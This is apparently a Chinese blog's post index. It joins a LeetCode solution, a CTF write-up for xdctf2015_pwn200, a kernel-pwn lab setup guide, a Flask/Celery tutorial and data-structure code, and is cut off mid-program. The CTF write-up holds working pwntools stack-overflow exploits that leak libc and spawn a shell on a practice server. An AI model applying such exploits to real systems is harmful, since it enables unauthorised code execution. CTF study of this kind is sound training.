使用队列完成二叉树的层序遍历通过观察可以发现新节点需要插入层次遍历时第一个出现的 “不完整的节点” （即不同时具有左右孩子节点）。如图中所示，绿色代表当前队列中的节点（规定节点的左右孩子均存在时才将它们一起先后压入队列)，当遍历到 “不完整的节点” 就找到了新节点插入的节点位置，“不完整的节点” 位于队列的头部。在 CBTInserter 函数中实现该过程，找到插入的位置，以及得到当前的队列。 插入操作时，先后检查队列头部节点的左右孩子，若左孩子缺失则将新节点插入其左孩子，右孩子缺失则插入右孩子。当队列头部节点的左右孩子都存在，则将其左右孩子压入队列尾部，队列的头部节点出队列，因为此时它已不是 “不完整的节点” 。更新后的队列的头部节点将是下一个 “不完整的节点”。按照规则依次处理接下来的插入操作。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class CBTInserter {private: queue&lt;TreeNode*&gt; que; TreeNode* root;public: CBTInserter(TreeNode* root) { this-&gt;root = root; que.push(root); while (que.front()-&gt;left != nullptr &amp;&amp; que.front()-&gt;right != nullptr) { que.push(que.front()-&gt;left); que.push(que.front()-&gt;right); que.pop(); } } int insert(int v) { TreeNode* node = new TreeNode(v); TreeNode* fa = que.front(); if (fa-&gt;left == nullptr) { fa-&gt;left = node; } else { fa-&gt;right = node; que.push(fa-&gt;left); que.push(fa-&gt;right); que.pop(); } return fa-&gt;val; } TreeNode* get_root() { return this-&gt;root; }};/** * Your CBTInserter object will be instantiated and called as such: * CBTInserter* obj = new CBTInserter(root); * int param_1 = obj-&gt;insert(v); * TreeNode* param_2 = obj-&gt;get_root(); */ 时间复杂度为 O(n)，队列中存的节点数为 O(n)，所以空间复杂度为 O(n)。","link":"/2022/01/30/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C%EF%BC%89/"},{"title":"xdctf2015_pwn200","text":"DynELF使用 程序分析程序检查：32位程序 主函数：vul中存在栈溢出 关于DynELF​ 在做漏洞利用时，由于 ASLR 的影响，我们在获取某些函数地址的时候，需要一些特殊的操作。一种方法是先泄露出 libc.so 中的某个函数，然后根据函数之间的偏移，计算得到我们需要的函数地址，这种方法的局限性在于我们需要能找到和目标服务器上一样的 libc.so，而有些特殊情况下往往并不能找到。而另一种方法，利用如 pwntools 的 DynELF 模块，对内存进行搜索，直接得到我们需要的函数地址。 ​ 官方文档里给出了下面的例子： 123456789101112131415161718192021222324252627282930313233343536# Assume a process or remote connectionp = process('./pwnme')# Declare a function that takes a single address, and# leaks at least one byte at that address.def leak(address): data = p.read(address, 4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or '').encode('hex'))) return data# For the sake of this example, let's say that we# have any of these pointers. One is a pointer into# the target binary, the other two are pointers into libcmain = 0xfeedf4celibc = 0xdeadb000system = 0xdeadbeef# With our leaker, and a pointer into our target binary,# we can resolve the address of anything.## We do not actually need to have a copy of the target# binary for this to work.d = DynELF(leak, main)assert d.lookup(None, 'libc') == libcassert d.lookup('system', 'libc') == system# However, if we *do* have a copy of the target binary,# we can speed up some of the steps.d = DynELF(leak, main, elf=ELF('./pwnme'))assert d.lookup(None, 'libc') == libcassert d.lookup('system', 'libc') == system# Alternately, we can resolve symbols inside another library,# given a pointer into it.d = DynELF(leak, libc + 0x1234)assert d.lookup('system') == system 可以看到，为了使用 DynELF，首先需要有一个 leak(address) 函数，通过这一函数可以获取到某个地址上最少 1 byte 的数据，然后将这个函数作为参数调用 d = DynELF(leak, main)，该模块就初始化完成了，然后就可以使用它提供的函数进行内存搜索，得到我们需要的函数地址。 漏洞利用第一次栈溢出write函数泄露libc地址，返回main函数，使用DynELF查找system地址写入/bin/sh，再次rop执行拿到shell EXP12345678910111213141516171819202122232425262728from pwn import *r=remote('node4.buuoj.cn',25224)# r= process('./bof')elf=ELF('./bof')read_addr=elf.symbols['read']write_addr=elf.symbols['write']main_addr=0x804851cbss_addr=elf.symbols['__bss_start'] def leak(addr): //write函数泄露libc地址 r.recvline() payload='a'*0x6c+'b'*0x4+p32(write_addr)+p32(main_addr)+p32(1)+p32(addr)+p32(0x4) r.sendline(payload) leak_addr=r.recv(4) return leak_addrd=DynELF(leak,elf=ELF('./bof'))system_addr=d.lookup('system','libc')payload='a'*0x6c+'b'*0x4+p32(read_addr)+p32(main_addr)+p32(0x0)+p32(bss_addr)+p32(0x8)r.sendline(payload)r.sendline('/bin/sh') # 通过read函数读入/bin/sh到bss段payload='a'*0x6c+'b'*0x4+p32(system_addr)+p32(main_addr)+p32(bss_addr)r.sendline(payload)r.interactive() 法二 : ret2dl-resolve 1234567891011121314151617181920212223242526272829303132333435#coding=UTF-8from pwn import *context.log_level = 'debug'sh = remote('node4.buuoj.cn',25224)elf = ELF('bof')libc = ELF('./libc-2.23x86.so')payload = 112 * 'a'payload += p32(elf.plt['write'])payload += p32(elf.symbols['main'])payload += p32(1)payload += p32(elf.got['write'])payload += p32(4)sh.sendline(payload)write_addr = u32(sh.recvuntil('\\xf7')[-4:]) #获取write函数地址print hex(write_addr)libcbase = write_addr - libc.symbols['write']system = libcbase + libc.symbols['system']binsh = libcbase + libc.search('/bin/sh').next()payload = 112 * 'a'payload += p32(system)payload += p32(0xdeadbeef)payload += p32(binsh)sh.sendline(payload)sh.interactive() 参考文章https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.8_dynelf.html","link":"/2022/02/01/xdctf2015_pwn200/"},{"title":"Kernel Pwn 学习（一）","text":"kernel pwn 环境搭建 编译内核首先到linux内核官网下载一份内核源代码并解压 选择一个版本下载，我选的是4.9[tallball]， 之后安装需要的依赖 12sudo apt-get updatesudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc 解压源码后进入内核目录，输入命令sudo make menuconfig进入内核设置 进入kernel hacking，检查保证勾选了以下选项(其实默认都是勾选的，只是进去看一眼而已) Kernel debugging Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers KGDB: kernel debugger 保存并退出 sudo make bzImage生成 bzImage，过程挺久的，完成后在boot下生成了一个bzImage文件 注: 在过程中可能报错没有规则可制作目标debian/certs/debian-uefi-certs.pem由certs/x509_certificate_list需求停止 解决方法：在主目录/usr/src/linux…中修改.config文件，去掉上述内容（如果还是不行就修改linux.4.9中的.config对应部分为空 重新编译即可 编译busybox构建文件系统在busybox官网下载busybox文件，最新版的就行 解压后进入目录，make menuconfig，同样会进入图形界面，在Settings 上勾选Build static binary (no shared libs),然后保存退出 编译，执行make install，根目录下会生成一个_install文件夹，进入文件夹配置 123456cd _installmkdir procmkdir systouch inittouch packetchmod +x init 编辑init 文件，用于内核初始化 123456789101112131415#!/bin/shecho &quot;{==DBG==} INIT SCRIPT&quot;mkdir /tmpmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t tmpfs none /tmp#mount指令 挂载某个分区到某个文件，这样就将分区与文件建立联系从而访问文件时就可以访问分区。# insmod /xxx.ko # 加载模块# insmod /hello.ko # 加载hello.ko模块mdev -s # We need this to find /dev/sda laterecho -e &quot;{==DBG==} Boot took $(cut -d' ' -f1 /proc/uptime) seconds&quot;setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user# exec /bin/sh #root 几个常见指令 insmod: 指定模块加载到内核中 rmmod: 从内核中卸载指定模块 lsmod: 列出已经加载的模块 在packet 中写入，用于将FileSystem 打包成映像 123#!/bin/shecho &quot;Generate rootfs.img&quot;find . | cpio -o --format=newc &gt; ./rootfs.img 运行 packet 将得到 rootfs.img文件 运行内核安装qemu 1234安装QEMU的依赖库sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-devsudo apt-get install qemu测试输入qemu + tab 如果有很多实例回显，就说明安装成功 之后写一个shell脚本启动qemu,将前面生成的bzImage,rootfs.img一起放到_install文件夹下，运行boot.sh，结果如下 如果显示权限不够则chmod +x boot.sh并在root下运行即可 shell中参数的含义： 123456789-m 是指定RMA大小(默认384)-kernel 是指定的内核镜像，这里是我们编译的镜像路径，也可以是我们下载好的镜像，如./vmlinuz-4.10.0-1004-gcp-initrd 设置刚刚利用 busybox 创建的 rootfs.img,作为内核启动的文件系统 -append 附加选项，指定no kaslr 可以关闭随机偏移--nographic和console=ttyS0一起使用，启动的界面就变成了当前终端-s 相当于-gdb tcp::1234的简写，可以直接通过主机的gdb远程连接-monitor 配置用户械的网络 // 将监视器重定向主机设备 /dev/null-smp 用于生明所以可能用的cps,ie,socket cores threads = maxcputs.-cpu 设置cpu的安全选项 到这里也说明了为什么kernel pwn 题目一般都会给出这3个文件.sh ,bzImage,rootfs.cpio，分别是启动脚本，kernel镜像以及文件系统映像 一般来说kernel pwn 里面，漏洞通常是出现在ko文件，也就是模块文件，驱动 文件中，而kernel pwn 的最终目标一般是提权，拿到root才能读取flag 参考文章https://blog.csdn.net/qq_40827990/article/details/97036109 https://n0va-scy.github.io/2020/06/21/kernel%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","link":"/2022/02/09/Kernel%20Pwn%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"flask配置celery异步任务","text":"flask配置celery异步任务 前言# 转载自：https://www.cnblogs.com/wxhou/p/14399237.html 在使用flask开发的时候，接口的返回需要很少的时间，所以我们需要将一些耗时的任务，放到异步后台去处理，例如：发送邮件，耗时的CPU任务等。在python web框架中celery这个库，可能是最合适的。 由于我使用flask的时间比较多，但是当我想把celery很好的与flask进行集成的时候，却发现并不是那么如意。花费了很久的时间去实践最后却是各种报错。出现了循环导入、app上下文、tasks not found等问题，尝试了种种却总是不如人意。 好在功夫不负有心人，在结合官方文档并查阅了大量资料后，终于把celery很好得集成在了flask项目中。我在这里记录一下，同时也希望对你们有所帮助。 配置# 开发环境 Windows10 python 3.8.6 flask 2.0.x celery 5.x broker redis pool eventlet simple模式#由于celery 5.0后推荐小写模式，与flask config大写规范有冲突，所以我们当同目录下创建一个celeryconfig.py文件 123celeryconfig.pybroker_url='redis://127.0.0.1:6379/1'result_backend='redis://127.0.0.1:6379/2' flask simple模式。 12345678910111213141516171819202122232425simple.pyfrom flask import Flaskfrom celery import Celeryimport celeryconfigapp = Flask(__name__)celery_app = Celery(app.import_name, broker=celeryconfig.broker_url, backend=celeryconfig.result_backend)celery_app.config_from_object(celeryconfig)@celery_app.task(name='simple/add2')def add2(x, y): return x + y@app.route('/')def index(): results = add2.delay(3, 5) return str(results.wait())if __name__ == '__main__': app.run(debug=True) 这些就是单文件模式的代码，这其中我们添加了一个任务add2，然后启动flask。 1python simple.py 由于celery和flask是同级别的app，所以我们需要一个新的窗口启动celery，加入-P参数指定异步workereventlet 1celery -A simple.celery_app worker -l info -P eventlet 当我们启动celery之后。看到最后一行的ready的时候，说明我们的celery已经启动成功了。 然后再看有下面标识说明我们的任务已经被添加成功了。 12[tasks] . simple/add2 访问网址：http://127.0.0.1:5000/ 同时我们查看一下celery的窗口： simple模式就结束了 Factory模式#当然我们如果用flask写一个稍微复杂的东西的话，其实工厂模式我们应该用的更多。下面我们一起来看看工厂模式中的配置。 目录结构#首先我们先规划一个flask+celery的目录结构。然后创建下面的文件： 1234567891011.├── app│ ├── __init__.py ——app主体文件│ ├── celeryconfig.py ——celery配置文件│ ├── config.py ——flask配置文件│ ├── models.py ——模型文件│ ├── tasks.py ——后台任务│ └── views.py ——视图文件├── data.db├── .flaskenv ——flask环境变量└── server.py ——运行文件 我们先创建一个注册celery的函数，主要功能是使用flask应用上下文。 123456789def register_celery(celery, app): class ContextTask(celery.Task): abstract = True def __call__(self, *args, **kwargs): with app.app_context(): return self.run(*args, **kwargs) celery.Task = ContextTask 然后我们创建create_app函数，将写好的注册celery函数加进去。 12345678def create_app(**kwargs): app = Flask(__name__) app.config.from_pyfile('config.py') db.init_app(app) register_celery(celery=kwargs.get('celery'), app=app) # &gt;&gt; 注册celery register_blueprints(app) register_commands(app) return app 上面这些都是我们在__init__文件中创建的，下面我们来创建celery的app 打开server.py 123456789101112131415from celery import Celeryfrom app import create_app, celeryconfigdef make_celery(app_name): celery = Celery(app_name, broker=celeryconfig.broker_url, backend=celeryconfig.result_backend) celery.config_from_object(celeryconfig) return celerymy_celery = make_celery(__name__)app = create_app(celery=my_celery) 我们把celery配置文件和flask工厂应用导入进来。然后创建make_celery函数生成celery应用。 生成celery应用后把celery传入到flask应用函数中去。这样把生成和注册分开写，解决了循环导入的问题。 接着我们创建一个tasks.py文件。 12345678910from server import my_celeryfrom .models import db, Message@my_celery.task()def add2(msg): message = Message(details=msg) db.session.add(message) db.session.commit() return &quot;success&quot; 从server文件中导入celery应用，然后创建任务。 然后在视图中引用任务。 1234567891011121314151617181920from flask import Blueprint, jsonifyfrom .models import db, Messagefrom .tasks import add2th = Blueprint('', __name__)@th.route('/')def index(): res = add2.delay(&quot;hello word&quot;) return jsonify(res.wait())@th.get('/msgs')def msg_list(): messages = Message.query.all() results = [] for message in messages: results.append(message.to_json()) return jsonify(results) celery的任务可以通过delay， 方法调用，参数在delay中直接传入。 详细介绍： celery文档#这些 API 定义了标准的执行选项集，也就是下面这三个方法： apply_async(args[, kwargs[, …]]) 发送一个任务消息。 delay(*args, **kwargs) 直接发送一个任务消息,但是不支持运行参数。 calling(__call__) 应用一个支持调用接口（例如，add(2,2)）的对象,意味着任务不会被一个 worker 执行,但是会在当前线程中执行(但是消息不会被发送)。 速查表 T.delay(arg, kwarg=value) 调用 apply_async 的快捷方式（.delay(_args, *_kwargs)等价于调用 .apply_async(args, kwargs)）。 T.apply_async((arg,), {'kwarg': value}) T.apply_async(countdown=10) 从现在起, 十秒内执行。 T.apply_async(eta=now + timedelta(seconds=10)) 从现在起十秒内执行，指明使用eta。 T.apply_async(countdown=60, expires=120) 从现在起一分钟执行，但在两分钟后过期。 T.apply_async(expires=now + timedelta(days=2)) 两天内过期，使用datetime对象。 例子 delay() 方法就像一个很规则的函数，很方便去调用它： 1task.delay(arg1, arg2, kwarg1='x', kwarg2='y') 用 apply_async() 替代你写的： 1task.apply_async(args=[arg1, arg2], kwargs={'kwarg1': 'x', 'kwarg2': 'y'}) 尽管运行十分方便，但是如果像设置额外的行参数，你必须用 apply_async 运行一下#运行之前我们需要先创建一个.flaskenv文件，指定以下我们的FLASK_APP环境变量是server.py 1FLASK_APP=server.py 好了之后，启动flask 1flask run 启动celery 1celery -A server.my_celery worker -l info -P eventlet 老规矩，看一下任务注册成功没 12[tasks] . app.tasks.add2 我们打开浏览器查看 可以看到执行成功了。再看看命令行。 任务已经成功的执行了。 就这样我们弄好了 flask+celery项目的配置，并成功执行了任务。 （待补充django+celery)","link":"/2022/02/13/flask%E9%85%8D%E7%BD%AE%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1/"},{"title":"数据结构基础代码总结（树和图）","text":"树和图部分 一、树和二叉树树的遍历123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct BiTNode { ElemType data; struct BiTNode *lchild, *rchild;} BiTNode, *BiTree;//先序遍历//递归void PreOrder(BiTree T) { if (T != NULL) { visit(T); PreOrder(T-&gt;lchild); PreOrder(T-&gt;rchild); }}//非递归void PreOrder2(BiTree T) { InitStack(S); BiTree p = T; while (p || !IsEmpty(S)) { if (p) { visit(p); Push(S, p); p = p-&gt;lchild; } else { Pop(S, p); p = p-&gt;rchild; } }}//中序遍历//递归void InOrder(BiTree T) { if (T != NULL) { InOrder(T-&gt;lchild); visite(T); InOrder(T-&gt;rchild); }}//非递归void InOrder2(BiTree T) { InitStack(S); BiTree p = T; while (p || !IsImpty(S)) { if (p) { push(S, p); p = p-&gt;lchild; } else { Pop(S, p); visit(p); p = p-&gt;rchild; } }}//后序遍历void PostOrder(BiTree T) { if (T != NULL) { PostOrder(T-&gt;lchild); PostOrder(T-&gt;rchild); visit(T); }}//层次遍历void LevelOrder(BiTree T) { InitQueue(Q); BiTree p; EnQueue(Q, T); while (!Empty(Q)) { DeQueue(Q, p); visit(p); if (p-&gt;lchild != NULL) EnQueue(Q, p-&gt;lchild); if (p-&gt;rchild != NULL) EnQueue(Q, p-&gt;rchild); }} 线索二叉树12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;typedef struct ThreadNode { ElemType data; struct ThreadNode *lchild, *rchild; int ltag, rtag;} ThreadNode, *ThreadTree;//中序线索二叉树//递归void InThread(ThreadTree &amp;p, ThreadTree &amp;pre) { if (p != NULL) { InThread(p-&gt;lchild, pre); //递归，线索化左子树 if (p-&gt;lchild == NULL) { //左子树为空，建立前驱线索 p-&gt;lchild = pre; p-&gt;ltag = 1; } if (pre != NULL &amp;&amp; pre-&gt;rchild == NULL) { pre-&gt;rchild = p; //建立前驱节点的后继线索 pre-&gt;rtag = 1; } pre = p; //标记当前结点为刚刚访问过的结点 InThread(p-&gt;rchild, pre); }}void CreatInThread(ThreadTree T) { ThreadTree pre = NULL; if (T != NULL) { InThead(T, pre); pre-&gt;rchild = NULL; //处理遍历的最后一个结点 pre-&gt;rtag = 1; }} 遍历1234567891011121314151617//中序线索树的遍历ThreadNode *Firstnode(ThreadNode *p){ while(p-&gt;ltag==0) p=p-&gt;lchild; return p;}ThreadNode *Nextnode(ThreadNode *p){ if(p-&gt;rtag==0) return Firstnode(p-&gt;rchild); else return p-&gt;rchild;}//不含头结点的中序线索树的中序遍历void Inorder(ThreadNode *T){ for(ThreadNode *p=Firstnode(T);p!=NULL;p=Nextnode(p)) visit(p);} 二、图BFS广度优先搜索主要使用队列实现，对每个节点可能到达的路径进行入队出队判断 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#define MaxVertexNum 100typedef char VertexType;typedef int EdgeType;int Max = 0x3f3f3f3f;typedef struct { VertexType Vex[MaxVertexNum]; EdgeType EdgeType[MaxVertexNum][MaxVertexNum]; int vexnum, arcnum;} Gragh;//BFS遍历bool visited[MaxVertexNum];void BFSTraverse(Graph G) { for (int i = 0; i &lt; G.vexnum; ++i) visited[i] = false; InitQueue(Q); for (int i = 0; i &lt; G.vexnum; ++i) if (!visited[i]) BFS(G, i);}void BFS(Graph G, int v) { visit(v); visited[v] = true; Enqueue(Q, v); while (!isEmpty(Q)) { DeQueue(Q, v); for (w = FirstNeighbor(G, v); w &gt;= 0; w = NextNeighbor(G, v, w)) if (!visited[w]) { visit(w); visited[w] = true; EnQueue(Q, w); } }}//BFS求单源最短路径void BFS_MIN_Distance(Graph G, int u) { for (int i = 0; i &lt; G.vexnum; i++) d[i] = Max; //初始化路径为无穷 visited[u] = true; d[u] = 0; EnQueue(Q, u); while (!isEmpty(Q)) { DeQueue(Q, u); for (w = FirstNeighbor(G, u); w &gt;= 0; w = NextNeighbor(G, u, w)) if (!visited[w]) { visited[w] = true; d[w] = d[u] + 1; EnQueue(Q, w); } }} DFS深度优先搜索 12345678910111213141516bool visited[MAX_VERTEX_NUM];void DFSTraverse(Graph G){ for(v=0;v&lt;G.vexnum;++v) visited[v]=FALSE; for(v=0;v&lt;G.vexnum;++v) if(!visited[v]) DFS(G,v);}void DFS(Graph G,int v){ visit(v); visited[v]=TRUE; for(w=FirstNeighbor(G,v);w&gt;=0;w=NextNeighbor(G,v,w)) if(!visited[w]){ DFS(G,w); }} 最小生成树关于图的几个概念定义： 连通图：在无向图中，若任意两个顶点vivi与vjvj都有路径相通，则称该无向图为连通图。强连通图：在有向图中，若任意两个顶点vivi与vjvj都有路径相通，则称该有向图为强连通图。连通网：在连通图中，若图的边具有一定的意义，每一条边都对应着一个数，称为权；权代表着连接连个顶点的代价，称这种连通图叫做连通网。生成树：一个连通图的生成树是指一个连通子图，它含有图中全部n个顶点，但只有足以构成一棵树的n-1条边。一颗有n个顶点的生成树有且仅有n-1条边，如果生成树中再添加一条边，则必定成环。最小生成树：在连通网的所有生成树中，所有边的代价和最小的生成树，称为最小生成树。 下面介绍两种求最小生成树算法 1.Kruskal算法此算法可以称为“加边法”，初始最小生成树边数为0，每迭代一次就选择一条满足条件的最小代价边，加入到最小生成树的边集合里。 把图中的所有边按代价从小到大排序；把图中的n个顶点看成独立的n棵树组成的森林；按权值从小到大选择边，所选的边连接的两个顶点ui,viui,vi,应属于两颗不同的树，则成为最小生成树的一条边，并将这两颗树合并作为一颗树。重复(3),直到所有顶点都在一颗树内或者有n-1条边为止。 Prim算法此算法可以称为“加点法”，每次迭代选择代价最小的边对应的点，加入到最小生成树中。算法从某一个顶点s开始，逐渐长大覆盖整个连通网的所有顶点。 图的所有顶点集合为VV；初始令集合u={s},v=V−uu={s},v=V−u;在两个集合u,vu,v能够组成的边中，选择一条代价最小的边(u0,v0)(u0,v0)，加入到最小生成树中，并把v0v0并入到集合u中。重复上述步骤，直到最小生成树有n-1条边或者n个顶点为止。由于不断向集合u中加点，所以最小代价边必须同步更新；需要建立一个辅助数组closedge,用来维护集合v中每个顶点与集合u中最小代价边信息，： 123456struct{ char vertexData //表示u中顶点信息 UINT lowestcost //最小代价}closedge[vexCounts] Prim算法最小生成树是一个图的极小连通子图，它包含原图的所有顶点，并且所有边的权值之和尽可能小。 Prim算法就是图的最小生成树算法之一，Prim 算法是一种求解加权无向连通图的 MST 问题的贪心算法。它能找出一个边的子集，使得其构成的树包含图中所有顶点，且边的权值之和最小。 Prim算法以图的顶点为基础，从首个初始顶点，寻找到达其他顶点权值最小的边，并把该顶点加入到“已到达顶点”的集合中，此时，这个集合就是这个图的最小生成树。 一般用一维数组比较方便表达最小生成树，数组下标所对应的元素，代表该顶点在最小生成树当中的父亲节点。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990// 基于Prim算法实现最小生成树#include &lt;iostream&gt;#include &lt;vector&gt;const int INF = 1e7;using namespace std;vector&lt;vector&lt;int&gt;&gt; Init() { int n, m; cout &lt;&lt; &quot;请输入带权无向图的定点数和边数(以空格隔开):&quot; &lt;&lt; endl; cin &gt;&gt; n &gt;&gt; m; vector&lt;vector&lt;int&gt;&gt; graph(n+1, vector&lt;int&gt;(n+1, INF)); cout &lt;&lt; &quot;请依次输入&quot; &lt;&lt; m &lt;&lt; &quot;条边的开始节点，结束节点，权值(以空格隔开):&quot; &lt;&lt; endl; int start, end, wet; for (int i = 0; i &lt; m; i++) { cin &gt;&gt; start &gt;&gt; end &gt;&gt; wet; graph[start][end] = wet; graph[end][start] = wet; } return graph;}int Prim(vector&lt;vector&lt;int&gt;&gt;&amp; c, int u) { int n = c.size() - 1; // 定义数据结构lowcost[]，closest[]，s[] vector&lt;int&gt; lowcost(n+1); vector&lt;int&gt; closest(n+1); vector&lt;bool&gt; s(n+1); /// 1.初始化lowcost[]，closest[]，s[] s[u] = true; for (int i = 1; i &lt;= n; i++) { if (i != u) { lowcost[i] = c[u][i]; closest[i] = u; s[i] = false; } else lowcost[i] = 0; } // n个节点之间需要找最短路径n-1次 for (int i = 0; i &lt; n-1; i++) { // 2.找最小 int tmp = INF, t = u; for (int j = 1; j &lt;= n; j++) { if (!s[j] &amp;&amp; (lowcost[j] &lt; tmp)) { //!s[j]表示j节点V-U集合中 t = j; tmp = lowcost[j]; } } // 找不到，跳出循环 if (t == u) break; // 将t加入集合U s[t] = true; // 3.更新 for (int j = 1; j &lt;= n; j++) { if ((!s[j]) &amp;&amp; (c[t][j] &lt; lowcost[j])) { lowcost[j] = c[t][j]; closest[j] = t; } } } // 4.打印最终结果 int totalcost = 0; cout &lt;&lt; &quot;lowcost[]数组：&quot;; for (int i = 1; i &lt;= n; i++) { cout &lt;&lt; lowcost[i] &lt;&lt; &quot; &quot;; totalcost += lowcost[i]; } cout &lt;&lt; endl; cout &lt;&lt; &quot;closest[]数组：&quot;; for (int i = 1; i &lt;= n; i++) { cout &lt;&lt; closest[i] &lt;&lt; &quot; &quot;; } cout &lt;&lt; endl; return totalcost;}// test main()int main() { vector&lt;vector&lt;int&gt;&gt; graph = Init(); int weight = Prim(graph, 1); // 1表示从1开始找 cout &lt;&lt; &quot;\\n最小生成树总的花费是：&quot; &lt;&lt; weight &lt;&lt; endl;} 实验结果请输入带权无向图的定点数和边数(以空格隔开):7 12请依次输入12条边的开始节点，结束节点，权值(以空格隔开):1 2 231 6 281 7 362 3 202 7 13 4 153 7 44 5 34 7 95 6 175 7 166 7 25lowcost[]数组：0 23 4 9 3 17 1closest[]数组：0 1 7 7 4 5 2 最小生成树总的花费是：57 D:\\projects\\test\\x64\\Release\\test.exe (进程 1788)已退出，返回代码为: 0。 Kruskal算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159/************************************************************************CSDN 勿在浮沙筑高台 http://blog.csdn.net/luoshixian099算法导论--最小生成树（Prim、Kruskal）2016年7月14日************************************************************************/#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;algorithm&gt;using namespace std;#define INFINITE 0xFFFFFFFF #define VertexData unsigned int //顶点数据#define UINT unsigned int#define vexCounts 6 //顶点数量char vextex[] = { 'A', 'B', 'C', 'D', 'E', 'F' };struct node { VertexData data; unsigned int lowestcost;}closedge[vexCounts]; //Prim算法中的辅助信息typedef struct { VertexData u; VertexData v; unsigned int cost; //边的代价}Arc; //原始图的边信息void AdjMatrix(unsigned int adjMat[][vexCounts]) //邻接矩阵表示法{ for (int i = 0; i &lt; vexCounts; i++) //初始化邻接矩阵 for (int j = 0; j &lt; vexCounts; j++) { adjMat[i][j] = INFINITE; } adjMat[0][1] = 6; adjMat[0][2] = 1; adjMat[0][3] = 5; adjMat[1][0] = 6; adjMat[1][2] = 5; adjMat[1][4] = 3; adjMat[2][0] = 1; adjMat[2][1] = 5; adjMat[2][3] = 5; adjMat[2][4] = 6; adjMat[2][5] = 4; adjMat[3][0] = 5; adjMat[3][2] = 5; adjMat[3][5] = 2; adjMat[4][1] = 3; adjMat[4][2] = 6; adjMat[4][5] = 6; adjMat[5][2] = 4; adjMat[5][3] = 2; adjMat[5][4] = 6;}int Minmum(struct node * closedge) //返回最小代价边{ unsigned int min = INFINITE; int index = -1; for (int i = 0; i &lt; vexCounts;i++) { if (closedge[i].lowestcost &lt; min &amp;&amp; closedge[i].lowestcost !=0) { min = closedge[i].lowestcost; index = i; } } return index;}void MiniSpanTree_Prim(unsigned int adjMat[][vexCounts], VertexData s){ for (int i = 0; i &lt; vexCounts;i++) { closedge[i].lowestcost = INFINITE; } closedge[s].data = s; //从顶点s开始 closedge[s].lowestcost = 0; for (int i = 0; i &lt; vexCounts;i++) //初始化辅助数组 { if (i != s) { closedge[i].data = s; closedge[i].lowestcost = adjMat[s][i]; } } for (int e = 1; e &lt;= vexCounts -1; e++) //n-1条边时退出 { int k = Minmum(closedge); //选择最小代价边 cout &lt;&lt; vextex[closedge[k].data] &lt;&lt; &quot;--&quot; &lt;&lt; vextex[k] &lt;&lt; endl;//加入到最小生成树 closedge[k].lowestcost = 0; //代价置为0 for (int i = 0; i &lt; vexCounts;i++) //更新v中顶点最小代价边信息 { if ( adjMat[k][i] &lt; closedge[i].lowestcost) { closedge[i].data = k; closedge[i].lowestcost = adjMat[k][i]; } } }}void ReadArc(unsigned int adjMat[][vexCounts],vector&lt;Arc&gt; &amp;vertexArc) //保存图的边代价信息{ Arc * temp = NULL; for (unsigned int i = 0; i &lt; vexCounts;i++) { for (unsigned int j = 0; j &lt; i; j++) { if (adjMat[i][j]!=INFINITE) { temp = new Arc; temp-&gt;u = i; temp-&gt;v = j; temp-&gt;cost = adjMat[i][j]; vertexArc.push_back(*temp); } } }}bool compare(Arc A, Arc B){ return A.cost &lt; B.cost ? true : false;}bool FindTree(VertexData u, VertexData v,vector&lt;vector&lt;VertexData&gt; &gt; &amp;Tree){ unsigned int index_u = INFINITE; unsigned int index_v = INFINITE; for (unsigned int i = 0; i &lt; Tree.size();i++) //检查u,v分别属于哪颗树 { if (find(Tree[i].begin(), Tree[i].end(), u) != Tree[i].end()) index_u = i; if (find(Tree[i].begin(), Tree[i].end(), v) != Tree[i].end()) index_v = i; } if (index_u != index_v) //u,v不在一颗树上，合并两颗树 { for (unsigned int i = 0; i &lt; Tree[index_v].size();i++) { Tree[index_u].push_back(Tree[index_v][i]); } Tree[index_v].clear(); return true; } return false;}void MiniSpanTree_Kruskal(unsigned int adjMat[][vexCounts]){ vector&lt;Arc&gt; vertexArc; ReadArc(adjMat, vertexArc);//读取边信息 sort(vertexArc.begin(), vertexArc.end(), compare);//边按从小到大排序 vector&lt;vector&lt;VertexData&gt; &gt; Tree(vexCounts); //6棵独立树 for (unsigned int i = 0; i &lt; vexCounts; i++) { Tree[i].push_back(i); //初始化6棵独立树的信息 } for (unsigned int i = 0; i &lt; vertexArc.size(); i++)//依次从小到大取最小代价边 { VertexData u = vertexArc[i].u; VertexData v = vertexArc[i].v; if (FindTree(u, v, Tree))//检查此边的两个顶点是否在一颗树内 { cout &lt;&lt; vextex[u] &lt;&lt; &quot;---&quot; &lt;&lt; vextex[v] &lt;&lt; endl;//把此边加入到最小生成树中 } }} int main(){ unsigned int adjMat[vexCounts][vexCounts] = { 0 }; AdjMatrix(adjMat); //邻接矩阵 cout &lt;&lt; &quot;Prim :&quot; &lt;&lt; endl; MiniSpanTree_Prim(adjMat,0); //Prim算法，从顶点0开始. cout 